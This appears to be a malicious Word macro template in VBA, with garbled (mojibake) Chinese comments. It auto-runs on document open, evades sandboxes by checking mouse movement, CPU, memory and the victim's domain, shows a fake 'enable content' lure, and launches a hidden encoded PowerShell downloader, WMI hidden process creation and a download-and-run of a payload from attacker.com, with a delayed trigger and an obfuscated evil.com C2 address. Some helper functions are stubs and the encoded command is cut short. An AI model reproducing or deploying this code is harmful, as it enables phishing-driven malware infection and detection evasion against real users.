' æ–‡ä»¶: macro_template.vba

' è‡ªåŠ¨æ‰§è¡Œå…¥å£ç‚¹
Sub AutoOpen()
    ' æ–‡æ¡£æ‰“å¼€æ—¶è‡ªåŠ¨æ‰§è¡Œ
    ExecutePayload
End Sub

Sub Document_Open()
    ' å¦ä¸€ä¸ªè‡ªåŠ¨æ‰§è¡Œå…¥å£
    ExecutePayload
End Sub

Sub ExecutePayload()
    ' æ£€æŸ¥ç¯å¢ƒï¼ˆåæ²™ç®±ï¼‰
    If IsInSandbox() Then
        Exit Sub
    End If
    
    ' ç¤¾ä¼šå·¥ç¨‹æç¤º
    MsgBox "æ­¤æ–‡æ¡£å—ä¿æŠ¤ã€‚ä¸ºäº†æŸ¥çœ‹å®Œæ•´å†…å®¹ï¼Œè¯·ç‚¹å‡»ä¸Šæ–¹'å¯ç”¨å†…å®¹'æŒ‰é’®ã€‚", vbInformation, "æ–‡æ¡£ä¿æŠ¤æç¤º"
    
    ' ç­‰å¾…ç”¨æˆ·å¯ç”¨å®
    If MacroEnabled() Then
        ' æ‰§è¡ŒPayload
        DownloadAndExecute
    End If
End Sub

Function IsInSandbox() As Boolean
    ' åæ²™ç®±æ£€æµ‹æŠ€å·§
    
    ' æ£€æŸ¥1: é¼ æ ‡ç§»åŠ¨
    Dim startPos As Long
    startPos = GetCursorPos()
    Sleep 2000
    If GetCursorPos() = startPos Then
        IsInSandbox = True
        Exit Function
    End If
    
    ' æ£€æŸ¥2: CPUæ ¸å¿ƒæ•°
    If Environ("NUMBER_OF_PROCESSORS") < 2 Then
        IsInSandbox = True
        Exit Function
    End If
    
    ' æ£€æŸ¥3: å†…å­˜å¤§å°
    If GetTotalMemory() < 2147483648 Then ' 2GB
        IsInSandbox = True
        Exit Function
    End If
    
    ' æ£€æŸ¥4: åŸŸåæ£€æŸ¥
    If InStr(Environ("USERDOMAIN"), "EXAMPLE") = 0 Then
        ' ä¸æ˜¯ç›®æ ‡å…¬å¸åŸŸï¼Œå¯èƒ½æ˜¯æ²™ç®±
        IsInSandbox = True
        Exit Function
    End If
    
    IsInSandbox = False
End Function

Function MacroEnabled() As Boolean
    ' æ£€æŸ¥å®æ˜¯å¦å·²å¯ç”¨
    On Error Resume Next
    MacroEnabled = (Err.Number = 0)
End Function

Sub DownloadAndExecute()
    ' Payloadä¸‹è½½å¹¶æ‰§è¡Œ
    
    ' æ–¹æ³•1: PowerShellä¸‹è½½å™¨
    Dim psCommand As String
    psCommand = "powershell -NoP -sta -NonI -W Hidden -Enc " & _
                "JABjAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIA"  ' Base64ç¼–ç 
    
    ' æ‰§è¡Œ
    Shell psCommand, vbHide
    
    ' æ–¹æ³•2: WMIæ‰§è¡Œï¼ˆæ›´éšè”½ï¼‰
    Dim objWMIService, objStartup, objConfig, objProcess
    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
    Set objStartup = objWMIService.Get("Win32_ProcessStartup")
    Set objConfig = objStartup.SpawnInstance_
    objConfig.ShowWindow = 0  ' éšè—çª—å£
    
    Set objProcess = objWMIService.Get("Win32_Process")
    objProcess.Create "cmd.exe /c powershell ...", Null, objConfig, intProcessID
    
    ' æ–¹æ³•3: ç›´æ¥ä¸‹è½½æ–‡ä»¶
    DownloadFile "http://attacker.com/payload.exe", Environ("TEMP") & "\update.exe"
    Shell Environ("TEMP") & "\update.exe", vbHide
End Sub

Function DownloadFile(url As String, dest As String)
    ' URLDownloadToFile API
    Dim ret As Long
    ret = URLDownloadToFile(0, url, dest, 0, 0)
    DownloadFile = (ret = 0)
End Function

' åæ£€æµ‹ï¼šå»¶æ—¶æ‰§è¡Œ
Sub DelayedExecution()
    ' ç­‰å¾…10åˆ†é’Ÿåæ‰§è¡Œï¼ˆæ²™ç®±é€šå¸¸5åˆ†é’Ÿè¶…æ—¶ï¼‰
    Application.OnTime Now + TimeValue("00:10:00"), "ExecutePayload"
End Sub

' æ··æ·†æŠ€å·§ï¼šå­—ç¬¦ä¸²æ‹¼æ¥
Function GetC2URL() As String
    ' é¿å…æ˜æ–‡URLè¢«æ£€æµ‹
    Dim p1, p2, p3 As String
    p1 = "htt"
    p2 = "ps://"
    p3 = "evil.com/payload"
    GetC2URL = p1 & p2 & p3
End Function
